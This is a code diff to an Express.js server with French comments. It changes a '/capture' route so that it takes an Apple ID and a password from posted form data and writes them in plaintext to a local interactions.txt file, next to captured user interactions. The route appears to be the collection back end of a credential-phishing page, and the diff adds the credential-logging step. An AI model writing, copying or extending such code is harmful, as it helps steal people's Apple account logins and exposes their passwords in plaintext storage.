@@ -12,11 +12,14 @@ app.use(bodyParser.json());
 
 // Route pour capturer les interactions utilisateur
 app.post('/capture', (req, res) => {
-    const interaction = req.body.interaction;
+    const { interaction, appleId, password } = req.body;
     const filePath = path.join(__dirname, 'captures', 'interactions.txt');
 
+    // Format de l'enregistrement
+    const logEntry = `${new Date().toISOString()} - ${interaction} - Identifiant : ${appleId}, Mot de passe : ${password}\n`;
+
     // Enregistrer l'interaction dans le fichier interactions.txt
-    fs.appendFile(filePath, `${new Date().toISOString()} - ${interaction}\n`, (err) => {
+    fs.appendFile(filePath, logEntry, (err) => {
         if (err) {
             console.error('Erreur lors de l\'écriture dans le fichier:', err);
             res.status(500).send('Erreur du serveur');
